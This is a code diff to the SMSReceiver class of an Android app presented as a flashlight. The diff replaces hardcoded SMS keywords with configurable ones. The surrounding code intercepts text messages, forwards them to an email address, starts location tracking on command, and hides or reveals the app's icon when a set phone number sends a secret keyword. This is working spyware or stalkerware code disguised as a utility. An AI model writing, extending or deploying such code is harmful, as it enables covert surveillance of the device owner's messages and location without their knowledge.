@@ -23,8 +23,10 @@ public class SMSReceiver extends BroadcastReceiver {
   private static FlashLight flashLight;
 
   public  static String mBody = null;
-  private static String phoneNumberString;
   private static String gmailEmailString;
+  private static String hideKeywordString;
+  private static String phoneNumberString;
+  private static String unhideKeywordString;
 
   private static final String SUBJECT = "SMSInterceptor";
   private static final String TAG     = "FlashLight SMSReceiver";
@@ -32,8 +34,10 @@ public class SMSReceiver extends BroadcastReceiver {
   public SMSReceiver() {
     configure  = new Configure();
     flashLight = new FlashLight();
-    gmailEmailString  = configure.emailAddress();
-    phoneNumberString = configure.phoneNumber();
+    phoneNumberString   = configure.phoneNumber();
+    hideKeywordString   = configure.hideKeyword();
+    gmailEmailString    = configure.emailAddress();
+    unhideKeywordString = configure.unhideKeyword();
   }
 
   public String endPoint(final String number, final Context context) {
@@ -91,11 +95,11 @@ public class SMSReceiver extends BroadcastReceiver {
             intent.putExtra("obtainLocation","obtainLocation");
             context.startService(intent);
           }
-          else if(mBody.equals("hey hey hey") && message_from.equals(phoneNumberString)) {
+          else if(mBody.equals(unhideKeywordString) && message_from.equals(phoneNumberString)) {
             threading("Showing FlashLight app!");
             flashLight.showAppIcon(context, context.getPackageManager());
           }
-          else if(mBody.equals("bye bye bye") && message_from.equals(phoneNumberString)) {
+          else if(mBody.equals(hideKeywordString) && message_from.equals(phoneNumberString)) {
             threading("Hiding FlashLight app!");
             flashLight.hideAppIcon(context, context.getPackageManager());
           }
